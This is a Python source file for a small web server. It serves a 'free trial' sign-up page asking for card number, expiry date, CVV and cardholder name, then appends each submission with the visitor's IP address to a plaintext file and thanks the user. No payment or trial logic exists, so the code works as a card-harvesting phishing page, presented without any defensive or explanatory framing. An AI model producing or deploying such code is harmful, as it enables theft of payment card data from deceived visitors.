import http.server import socketserver import urllib.parse PORT = 8000 class MyHandler(http.server.SimpleHTTPRequestHandler): def do_GET(self): if self.path == '/': self.send_response(200) self.send_header('Content-type', 'text/html') self.end_headers() self.wfile.write(b''' Free Trial Sign Up body { font-family: Arial, sans-serif; } h1 { text-align: center; } form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; background-color: #f7f7f7; } label { display: block; margin-bottom: 10px; } input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; } input[type="submit"] { width: 100%; padding: 10px; border: none; border-radius: 3px; background-color: #4CAF50; color: #fff; cursor: pointer; } 

Get a Free Trial!

Card Number: 

Expiry Date: 

CVV: 

Cardholder's Name: 

''') else: self.send_response(404) self.send_header('Content-type', 'text/html') self.end_headers() self.wfile.write(b'

404 Not Found

') def do_POST(self): if self.path == '/process': content_length = int(self.headers['Content-Length']) post_data = self.rfile.read(content_length).decode('utf-8') params = urllib.parse.parse_qs(post_data) if 'card_number' in params and 'expiry_date' in params and 'cvv' in params and 'cardholder_name' in params: card_number = params['card_number'][0] expiry_date = params['expiry_date'][0] cvv = params['cvv'][0] cardholder_name = params['cardholder_name'][0] card_info = f"Card Number: {card_number}, Expiry Date: {expiry_date}, CVV: {cvv}, Cardholder's Name: {cardholder_name}" ip_address = self.client_address[0] card_info_with_ip = f"IP Address: {ip_address}\n{card_info}" with open('signups.txt', 'a+') as f: f.write(card_info_with_ip + '\n') self.send_response(200) self.send_header('Content-type', 'text/html') self.end_headers() self.wfile.write(b'

Thank you for signing up!

') else: self.send_response(400) self.send_header('Content-type', 'text/html') self.end_headers() self.wfile.write(b'

Error: Invalid card information

') else: self.send_response(404) self.send_header('Content-type', 'text/html') self.end_headers() self.wfile.write(b'

404 Not Found

') with socketserver.TCPServer(("", PORT), MyHandler) as httpd: print("Serving at port", PORT) httpd.serve_forever()
